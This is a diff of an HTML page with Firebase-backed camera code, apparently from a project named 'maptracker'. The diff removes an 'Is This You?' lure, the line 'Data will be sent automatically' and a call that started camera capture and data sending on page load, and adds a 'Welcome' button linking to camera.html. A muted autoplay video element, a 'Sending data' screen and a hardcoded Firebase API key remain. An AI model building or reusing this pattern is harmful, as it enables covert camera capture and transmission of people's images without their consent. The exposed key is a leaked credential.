@@ -49,21 +49,37 @@
             color: #ffff00;
             margin: 10px 0;
         }
+        .open-button {
+            background-color: #00cc00;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 18px;
+            transition: background-color 0.3s;
+            width: 100%;
+        }
+        .open-button:hover {
+            background-color: #009900;
+        }
     </style>
 </head>
 <body>
+    <h1>Welcome!</h1>
+    <p>Click below to open the camera functionality.</p>
+    <a href="camera.html" target="_blank" class="open-button">Open Camera</a> <!-- Link to camera functionality page -->
     <div id="loading-screen">
         <div id="loading-message">
             <i class="fas fa-spinner fa-spin"></i> Sending data, please wait...
         </div>
     </div>
-    <h1>Is This You?</h1>
-    <p>Data will be sent automatically.</p>
     <video id="video" autoplay playsinline muted></video> <!-- Added muted attribute for mobile -->
     <div id="error-message" class="error-message"></div>
     <div id="info-message" class="info-message"></div>
 
     <script type="module">
+        // Existing Firebase configuration code
         const firebaseConfig = {
             apiKey: "AIzaSyDGOfNv0d5SlEsq2LvOJZJEJSgANeswKd4", // Your API Key
             authDomain: "maptracker-7afb6.firebaseapp.com", // Your Auth Domain
@@ -188,9 +204,6 @@
             tracks.forEach(track => track.stop()); // Stop all tracks
             videoElement.style.display = 'none'; // Hide video element
         }
-
-        // Start the process on page load
-        startProcess();
     </script>
 </body>
 </html>
